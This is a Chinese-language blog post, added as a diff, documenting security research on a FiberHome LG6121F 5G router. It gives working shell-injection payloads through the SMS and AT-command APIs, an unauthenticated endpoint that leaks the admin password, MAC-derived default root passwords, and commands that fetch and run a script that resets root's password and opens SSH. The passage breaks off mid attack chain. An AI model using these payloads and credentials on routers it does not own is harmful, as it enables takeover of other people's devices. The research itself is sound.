@@ -1,0 +1,366 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="Ming"><title>烽火 LG6121F 5G CPE 安全研究 :: Codming</title><meta name=description content="烽火 LG6121F 5G CPE 获取 root 权限与固件修改全记录。通过短信注入、AT 命令注入等多种方式获取 root shell，逆向 Web API 发现未认证接口可直接读取管理员密码，修改固件激活 OpenWrt overlayfs 实现 SSH 持久化自启动，以及 hw_nat 硬件加速机制的逆向分析。适用于希望对烽火 CPE 进行深度定制、刷机或安装 OpenWrt 插件的用户参考。"><meta name=keywords content="烽火,FiberHome,LG6121F,5G CPE,OpenWrt,命令注入,固件修改,SSH,MT6890,硬件NAT,overlayfs,dropbear,烽火CPE刷机,烽火CPE获取root,烽火CPE安装OpenWrt"><link rel="shortcut icon" href=https://codming.com/images/favicon.svg><link rel=preload href=https://codming.com/fonts/custom-remixicon.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/critical.min.26f87d146e94923dcbc04bfd1357d4403d9e9d0f6a706e891792e98e58684fc0.css><link rel=stylesheet href=/css/highlight.min.4012e75df79b0561a35930f50b37b6dd25031fd5016335e9f15bd6949ef91fba.css media=print onload='this.media="all"'><noscript><link rel=stylesheet href=/css/highlight.min.4012e75df79b0561a35930f50b37b6dd25031fd5016335e9f15bd6949ef91fba.css></noscript></head><body><div class="main animate__animated animate__fadeInDown"><div class="nav_container animated fadeInDown"><div class=site_nav id=site_nav><ul><li><a href=/>Home</a></li><li><a href=/posts/>Archive</a></li><li><a href=/tags/>Tags</a></li><li><a href=/about/>About</a></li></ul></div><div class=menu_icon><a id=menu_icon><i class=ri-menu-line></i></a></div></div><div class="header animated fadeInDown"><div class=site_title_container><div class=site_title><h1><a href=https://codming.com/><span>Codming</span></a></h1></div><div class=description><p class=sub_title>Enjoy Life, Enjoy Coding.</p><div class=my_socials><a href=https://github.com/sigming title=github target=_blank><i class=ri-github-fill></i></a>
+<a href=https://x.com/codming title=twitter target=_blank><i class=ri-twitter-x-fill></i></a>
+<a href=https://codming.com/index.xml type=application/rss+xml title=rss target=_blank><i class=ri-rss-fill></i></a></div></div></div></div><div class=content><div class=post_page><div class="post animate__animated animate__fadeInDown"><div class="post_title post_detail_title"><h2><a href=/posts/fiberhome-lg6121f-5g-cpe-research/>烽火 LG6121F 5G CPE 安全研究</a></h2><span class=date>2026.04.12</span></div><div class="post_content markdown"><p>两年前买了一台烽火 5G CPE，使用了半年左右，就一直放着吃灰，最近翻出来，想看看能不能获取 root 权限、跑一些自定义服务。折腾了一段时间，在 Web API 里发现了不少安全问题，也成功实现了固件修改和 SSH 持久化。这篇文章把整个研究过程记录下来。</p><p>先看看设备的基本规格，详细的拆机测评可以看 <a href=https://www.acwifi.net/17162.html>Acwifi</a> 的文章：</p><ul><li><strong>型号</strong>：FiberHome LG6121F（烽火 5G CPE 一代）</li><li><strong>SoC</strong>：MediaTek MT6890 (T750)，ARMv8 Cortex-A55 四核</li><li><strong>内存</strong>：1GB</li><li><strong>存储</strong>：NAND Flash，UBI 分区</li><li><strong>5G 模块</strong>：Quectel RG500L</li><li><strong>系统</strong>：OpenWrt 19.07.7，Linux 4.19.190，musl libc 1.1.24</li></ul><p><div class=fancybox><a data-fancybox=gallery href=https://static.codming.com/img/20260413174656280.jpg><img src=https://static.codming.com/img/20260413174656280.jpg alt="图源 Acwifi" fetchpriority=high></a><div class=image-caption>图源 Acwifi</div></div></p><p>5G 信号表现还不错，我这边的基站数据：</p><ul><li><strong>模式</strong>：5G SA（独立组网），N78 频段 (3.5GHz)，带宽 100 MHz</li><li><strong>信号质量</strong>：RSRP -77 ~ -81 dBm，SINR 16 dB，2×2 MIMO</li></ul><p>我这张电信卡限制下行 500 Mbps，上行 100 Mbps，实际测试最高能到 400 Mbps / 100 Mbps，晚高峰基站限速的情况下，下行大概可以跑到 200 - 300 Mbps。</p><p><div class=fancybox><a data-fancybox=gallery href=https://static.codming.com/img/20260413174656288.png><img src=https://static.codming.com/img/20260413174656288.png alt=峰谷测速对比 loading=lazy></a><div class=image-caption>峰谷测速对比</div></div></p><p><em>以下分析均基于 RP0108 版本，不同版本 API 和漏洞可能有所不同，具体以实际测试为准。</em></p><blockquote><p>以下内容仅供教育目的和已授权的测试，请仅在您拥有所有权或已获得明确书面许可的网络和设备上使用。对于因使用本文内容或脚本而导致的任何滥用或损害，作者概不负责。</p></blockquote><h3 id=web-api>Web API</h3><p>烽火 CPE 提供一个 Web 页面管理设备，架构是：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>浏览器/APP → Nginx (:80/:443) → FastCGI webs (:8840)
+</span></span></code></pre></div><p>前端请求由 Nginx 接收，转发给后端的 <code>/fhrom/bin/webs</code> 进程处理。<code>webs</code> 通过 FastCGI 协议通信，以 root 权限运行。</p><p>设备提供了四类 API 端点，后面获取 Shell 的时候会频繁用到：</p><table><thead><tr><th>端点路径</th><th>认证</th><th>加密</th><th>说明</th></tr></thead><tbody><tr><td><code>/api/tmp/FHAPIS</code></td><td>需要 superadmin 登录</td><td>AES-CBC</td><td>主要管理接口</td></tr><tr><td><code>/api/tmp/FHNCAPIS</code></td><td><strong>无需认证</strong></td><td>AES-CBC</td><td>含敏感读写</td></tr><tr><td><code>/api/tmp/FHTOOLAPIS</code></td><td>APP 级登录</td><td><strong>明文</strong></td><td>主要供手机 APP 使用</td></tr><tr><td>CGI 接口</td><td>部分需要登录</td><td>无</td><td>Telnet/ADB 开关等</td></tr></tbody></table><p>AES 加密方式如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>key = sessionid 前 16 字节
+</span></span><span class=line><span class=cl>IV  = 固定值 bytes([112, 113, ..., 127])，HEX 70717273...7e7f
+</span></span><span class=line><span class=cl>模式: AES-128-CBC，PKCS7 填充，HEX 编码
+</span></span></code></pre></div><p>而 sessionid 可以通过一个无需认证的 GET 请求获取：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>GET /api/tmp/FHNCAPIS?ajaxmethod<span class=o>=</span>get_refresh_sessionid
+</span></span><span class=line><span class=cl>→ <span class=o>{</span><span class=s2>&#34;sessionid&#34;</span>: <span class=s2>&#34;xxxxxxxxxxxxxxxx...&#34;</span><span class=o>}</span>
+</span></span></code></pre></div><p>后面涉及 API 调用时，统一用简化的伪代码表示。实际调用流程如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>pad</span><span class=p>,</span> <span class=n>unpad</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>IV</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>i</span> <span class=o>+</span> <span class=mi>112</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>)])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=n>plaintext</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>key</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>IV</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=n>plaintext</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>))</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>hex_str</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>key</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>IV</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>unpad</span><span class=p>(</span><span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>hex_str</span><span class=p>)),</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 1. 获取 sessionid，派生 AES key</span>
+</span></span><span class=line><span class=cl><span class=n>sid</span> <span class=o>=</span> <span class=n>GET</span><span class=p>(</span><span class=s1>&#39;/api/tmp/FHNCAPIS?ajaxmethod=get_refresh_sessionid&#39;</span><span class=p>)[</span><span class=s1>&#39;sessionid&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>sid</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 2. 登录（请求体 JSON 加密后 POST，响应同样需要解密）</span>
+</span></span><span class=line><span class=cl><span class=n>POST</span><span class=p>(</span><span class=s1>&#39;/api/sign/DO_WEB_LOGIN&#39;</span><span class=p>,</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;dataObj&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=s1>&#39;superadmin&#39;</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;密码&gt;&#39;</span><span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;ajaxmethod&#39;</span><span class=p>:</span> <span class=s1>&#39;DO_WEB_LOGIN&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;sessionid&#39;</span><span class=p>:</span> <span class=n>sid</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>}),</span> <span class=n>key</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 3. 调用接口</span>
+</span></span><span class=line><span class=cl><span class=n>resp</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>POST</span><span class=p>(</span><span class=s1>&#39;/api/tmp/FHAPIS&#39;</span><span class=p>,</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;dataObj&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;command&#39;</span><span class=p>:</span> <span class=s1>&#39;AT&#39;</span><span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;ajaxmethod&#39;</span><span class=p>:</span> <span class=s1>&#39;set_at_command&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;sessionid&#39;</span><span class=p>:</span> <span class=n>sid</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>}),</span> <span class=n>key</span><span class=p>)),</span> <span class=n>key</span><span class=p>)</span>
+</span></span></code></pre></div><h2 id=获取-shell-访问>获取 Shell 访问</h2><h3 id=开启-ssh-所需步骤>开启 SSH 所需步骤</h3><p>在介绍各种拿 shell 的方法之前，需要知道直接运行 <code>dropbear -p 22</code> 是不行的，有两个障碍：</p><ol><li><strong>Host key 无法生成</strong>：根文件系统是只读的 squashfs，dropbear 默认的 key 目录 <code>/etc/dropbear/</code> 不可写，需要手动生成 key 到 <code>/tmp</code></li><li><strong>默认密码无法登录</strong>：<code>/etc/shadow</code> 中 root 密码的 hash 是 SHA-512（<code>$6$</code>），但设备的 musl libc <code>crypt()</code> 只支持 DES 和 MD5（<code>$1$</code>），导致 SSH 登录时密码校验永远失败。需要生成一个 MD5 hash 的 shadow 文件并 bind mount 覆盖</li></ol><p>我把这些步骤整理成了一个脚本，一键进行这些操作：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#!/bin/sh
+</span></span></span><span class=line><span class=cl><span class=c1># FiberHome LG6121F - 一键开启 SSH</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 覆盖 /etc/shadow，密码设为 root123</span>
+</span></span><span class=line><span class=cl><span class=nv>ROOT_PASS</span><span class=o>=</span><span class=s1>&#39;root123&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>ROOT_HASH</span><span class=o>=</span><span class=k>$(</span><span class=nv>OPENSSL_CONF</span><span class=o>=</span>/dev/null openssl passwd -1 -salt <span class=s1>&#39;&#39;</span> <span class=s2>&#34;</span><span class=nv>$ROOT_PASS</span><span class=s2>&#34;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span> ! -f /data/shadow_orig <span class=o>]</span> <span class=o>&amp;&amp;</span> cp /etc/shadow /data/shadow_orig
+</span></span><span class=line><span class=cl>umount /etc/shadow 2&gt;/dev/null
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;root:</span><span class=si>${</span><span class=nv>ROOT_HASH</span><span class=si>}</span><span class=s2>:18673:0:99999:7:::
+</span></span></span><span class=line><span class=cl><span class=s2>daemon:*:0:0:99999:7:::
+</span></span></span><span class=line><span class=cl><span class=s2>ftp:*:0:0:99999:7:::
+</span></span></span><span class=line><span class=cl><span class=s2>network:*:0:0:99999:7:::
+</span></span></span><span class=line><span class=cl><span class=s2>nobody:*:0:0:99999:7:::
+</span></span></span><span class=line><span class=cl><span class=s2>dnsmasq:*:0:0:99999:7:::
+</span></span></span><span class=line><span class=cl><span class=s2>sshd:*:0:0:99999:7:::&#34;</span> &gt; /tmp/shadow_new
+</span></span><span class=line><span class=cl>mount --bind /tmp/shadow_new /etc/shadow
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 启动 dropbear SSH（优先使用 /data 持久 key）</span>
+</span></span><span class=line><span class=cl>pidof dropbear &gt; /dev/null <span class=o>||</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>KEY</span><span class=o>=</span>/tmp/dropbear_key
+</span></span><span class=line><span class=cl>    <span class=o>[</span> -f /data/dropbear_rsa_key <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=nv>KEY</span><span class=o>=</span>/data/dropbear_rsa_key
+</span></span><span class=line><span class=cl>    <span class=o>[</span> ! -f <span class=s2>&#34;</span><span class=nv>$KEY</span><span class=s2>&#34;</span> <span class=o>]</span> <span class=o>&amp;&amp;</span> dropbearkey -t rsa -f <span class=s2>&#34;</span><span class=nv>$KEY</span><span class=s2>&#34;</span> 2&gt;/dev/null
+</span></span><span class=line><span class=cl>    dropbear -p <span class=m>22</span> -r <span class=s2>&#34;</span><span class=nv>$KEY</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 放行防火墙</span>
+</span></span><span class=line><span class=cl>iptables -C INPUT -p tcp --dport <span class=m>22</span> -j ACCEPT 2&gt;/dev/null <span class=o>||</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>    iptables -I INPUT <span class=m>1</span> -p tcp --dport <span class=m>22</span> -j ACCEPT
+</span></span></code></pre></div><p>可以用我写好的，也可以自己写一个类似的脚本上传到 CPE 可以访问的地方，后面各种方法拿到 shell 后都可以执行这个脚本来开启 SSH 服务：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 下载脚本到持久分区</span>
+</span></span><span class=line><span class=cl>curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 执行</span>
+</span></span><span class=line><span class=cl>sh /data/ssh_enable.sh
+</span></span></code></pre></div><p>完成后登录：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>ssh root@192.168.8.1
+</span></span><span class=line><span class=cl><span class=c1># 密码: root123</span>
+</span></span></code></pre></div><p>注意，这些都是临时的，重启后 <code>/tmp</code> 清空，bind mount 失效，dropbear 和防火墙规则都会丢失。持久化方案见后面的「解锁与固件修改」章节。但脚本本身保存在 <code>/data/</code>，重启后再执行一次 <code>sh /data/ssh_enable.sh</code> 就能恢复。</p><p>下面介绍几种在设备上执行命令的方式，按操作便捷程度排序。</p><h3 id=短信功能注入>短信功能注入</h3><p>这是最容易操作的方式，在设备的 Web 管理页面或官方 APP 里发短信就行，但缺点是注入成功没有回显，需要以实际能否连接为准，如果命令错误或者版本更新后漏洞无法利用，那可以看后面的其他方式。</p><p>设备的短信发送功能使用 <code>send_msg</code> 接口，后端会把参数拼接成 shell 命令执行：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>mn_send_pdu <span class=s1>&#39;%s&#39;</span>    <span class=s1>&#39;%s&#39;</span>    <span class=s2>&#34;%s&#34;</span>
+</span></span><span class=line><span class=cl>//           ↑       ↑       ↑
+</span></span><span class=line><span class=cl>//      recv_number encode content
+</span></span></code></pre></div><p>其中 <code>content</code> 字段用双引号包裹。前端虽然做了转义，但直接调用 API 可以绕过。更简单的是，反引号 <code>`</code> 在前端没有被转义，可以在 Web 页面的短信输入框中使用。</p><p><div class=fancybox><a data-fancybox=gallery href=https://static.codming.com/img/20260413174656282.gif><img src=https://static.codming.com/img/20260413174656282.gif alt=短信发送注入 loading=lazy></a><div class=image-caption>短信发送注入</div></div></p><p>新建短信，收件人填一个正常号码，比如 <code>10000</code>，也可以写你自己的其他手机号，这样可以通过收到的短信内容查看是否有报错信息，短信内容填：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>test`id &gt; /tmp/inject_test`
+</span></span></code></pre></div><p>点击发送后，后端生成的 shell 命令是：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>mn_send_pdu <span class=s1>&#39;10000&#39;</span> <span class=s1>&#39;GSM_8BIT&#39;</span> <span class=s2>&#34;test`id &gt; /tmp/inject_test`&#34;</span>
+</span></span></code></pre></div><p>Shell 在解析双引号字符串时，会先对反引号 <code>`</code> 包裹的内容进行命令替换（Command Substitution），即先执行 <code>id > /tmp/inject_test</code>，再把输出拼回原字符串，然后才执行 <code>mn_send_pdu</code> 发送短信。</p><p>确认注入可用后，通过发送下面的两条短信来开启 SSH：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>test`curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh`
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>test`sh /data/ssh_enable.sh`
+</span></span></code></pre></div><p>短信注入没有回显，发送后直接尝试 <code>ssh root@192.168.8.1</code>（密码 root123），如果连不上则检查命令是否正确，或者是否成功下载了脚本。</p><p>如果通过 API 直接调用，注入方式更灵活，<code>content</code> 字段可以用双引号闭合：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>$post</span><span class=p>(</span><span class=s2>&#34;send_msg&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>recv_number</span><span class=o>:</span> <span class=s2>&#34;10000&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>encode_schema</span><span class=o>:</span> <span class=s2>&#34;GSM_8BIT&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>content</span><span class=o>:</span> <span class=s1>&#39;hello&#34;;sh /data/ssh_enable.sh;echo &#34;&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=c1>// 生成: mn_send_pdu &#39;10000&#39; &#39;GSM_8BIT&#39; &#34;hello&#34;;sh /data/ssh_enable.sh;echo &#34;&#34;
+</span></span></span></code></pre></div><p><code>recv_number</code> 字段同样可以注入（单引号闭合）：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>$post</span><span class=p>(</span><span class=s2>&#34;send_msg&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>recv_number</span><span class=o>:</span> <span class=s2>&#34;&#39;;sh /data/ssh_enable.sh;echo &#39;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>encode_schema</span><span class=o>:</span> <span class=s2>&#34;GSM_8BIT&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>content</span><span class=o>:</span> <span class=s2>&#34;test&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>})</span>
+</span></span></code></pre></div><p>三个参数都没有做服务端过滤，注入非常自由。</p><h3 id=at-指令注入>AT 指令注入</h3><p><code>set_at_command</code> 接口用于向 5G 模块发送 AT 命令，后端实现是：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>snprintf</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>,</span> <span class=s>&#34;mipc_wan_cli --at_cmd %s&#34;</span><span class=p>,</span> <span class=n>user_input</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nf>popen</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>  <span class=c1>// root 权限执行，stdout 会返回给前端
+</span></span></span></code></pre></div><p>过滤了 <code>&</code>、<code>;</code> 和 <code>reboot</code> 关键字，但是没有过滤管道符 <code>|</code>、<code>$()</code>、反引号等。利用方式：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>命令: AT|id
+</span></span><span class=line><span class=cl>实际执行: mipc_wan_cli --at_cmd AT | id
+</span></span></code></pre></div><p><code>AT</code> 是一个空的 AT 命令（模块会回复 OK），管道符 <code>|</code> 把两个进程分开，右边的命令独立执行。而且 stdout 会被捕获并返回，所以可以看到命令输出。</p><p>这个接口走 FHAPIS 端点，需要 superadmin 登录：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>POST /api/tmp/FHAPIS  <span class=nv>ajaxmethod</span><span class=o>=</span>set_at_command
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;command&#39;</span>: <span class=s1>&#39;AT|id&#39;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=c1># → {&#34;at_result&#34;: &#34;uid=0(root) gid=0(root)\n&#34;}</span>
+</span></span></code></pre></div><p>用这个方法开启 SSH：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>POST /api/tmp/FHAPIS  <span class=nv>ajaxmethod</span><span class=o>=</span>set_at_command
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;command&#39;</span>: <span class=s1>&#39;AT|curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh&#39;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>POST /api/tmp/FHAPIS  <span class=nv>ajaxmethod</span><span class=o>=</span>set_at_command
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;command&#39;</span>: <span class=s1>&#39;AT|sh /data/ssh_enable.sh&#39;</span><span class=o>}</span>
+</span></span></code></pre></div><h3 id=adb-方式>ADB 方式</h3><p>登录 Web 管理页面后，访问 <code>http://192.168.8.1/cgi-bin/adbdebug?enable=1</code> 开启 ADB，页面显示 <code>adb/at open</code></p><p>然后用 Micro USB 线连接设备和电脑。注意需要<strong>支持数据传输</strong>的线材，很多小家电自带的线只能充电。连接后先确认设备是否识别：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>adb devices
+</span></span><span class=line><span class=cl><span class=c1># 应该能看到设备列表中出现一条记录</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 下载并执行脚本开启 SSH</span>
+</span></span><span class=line><span class=cl>adb shell <span class=s2>&#34;curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>adb shell <span class=s2>&#34;sh /data/ssh_enable.sh&#34;</span>
+</span></span></code></pre></div><h3 id=telnet间接方式>Telnet：间接方式</h3><p>Telnet 是一个相对传统的路径，需要多走几步。先访问 CGI 接口开启：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>curl <span class=s1>&#39;http://192.168.8.1/cgi-bin/fh_telnet?enable=1&amp;key=&lt;key&gt;&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># key 的计算方式：设备 bridge MAC 地址后 6 位（十六进制）加 1。</span>
+</span></span><span class=line><span class=cl><span class=c1># 比如 MAC 是 `A1:B2:C3:D4:E5:F6`，后 6 位是 `D4E5F6`，加 1 得到 `D4E5F7`</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>telnet 192.168.8.1
+</span></span><span class=line><span class=cl><span class=c1># 用户名: admin</span>
+</span></span><span class=line><span class=cl><span class=c1># 默认密码: hg2x0 + MAC 后6位，例如 hg2x0D4E5F6</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>su root
+</span></span><span class=line><span class=cl><span class=c1># 默认密码: f1ber@dm!n + MAC 后6位，例如 f1ber@dm!nD4E5F6</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 下载并执行脚本开启 SSH</span>
+</span></span><span class=line><span class=cl>curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh
+</span></span><span class=line><span class=cl>sh /data/ssh_enable.sh
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 退出 Telnet，SSH 登录</span>
+</span></span><span class=line><span class=cl><span class=nb>exit</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ssh root@192.168.8.1
+</span></span><span class=line><span class=cl><span class=c1># 密码: root123</span>
+</span></span></code></pre></div><h3 id=不知道管理员密码时>不知道管理员密码时</h3><p>前面几种方法（除了 ADB）都需要知道 Web 管理员密码或者 MAC 地址。如果你啥都不知道，只是连上了这个设备的 WiFi 呢？</p><p><code>FHNCAPIS</code> 端点是<strong>完全不需要认证</strong>的，而且它能读写 TR-069 参数，包括超级管理员的明文密码。</p><p><strong>完整攻击链，只需 4 个 HTTP 请求：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 1. 获取 sessionid（无需认证）</span>
+</span></span><span class=line><span class=cl>GET /api/tmp/FHNCAPIS?ajaxmethod<span class=o>=</span>get_refresh_sessionid
+</span></span><span class=line><span class=cl><span class=c1># → {&#34;sessionid&#34;: &#34;abc123...&#34;}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 2. 读取超管密码（无需认证，AES 加密）</span>
+</span></span><span class=line><span class=cl>POST /api/tmp/FHNCAPIS  <span class=nv>ajaxmethod</span><span class=o>=</span>get_value_by_xmlnode
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;InternetGatewayDevice.X_FH_WebUserInfo.2.WebSuperPassword&#39;</span>: <span class=s1>&#39;&#39;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=c1># → {&#34;WebSuperPassword&#34;: &#34;F1ber$dm&#34;}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 3. 用获取到的密码登录</span>
+</span></span><span class=line><span class=cl>POST /api/sign/DO_WEB_LOGIN
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;username&#39;</span>: <span class=s1>&#39;superadmin&#39;</span>, <span class=s1>&#39;password&#39;</span>: <span class=s1>&#39;F1ber$dm&#39;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl>
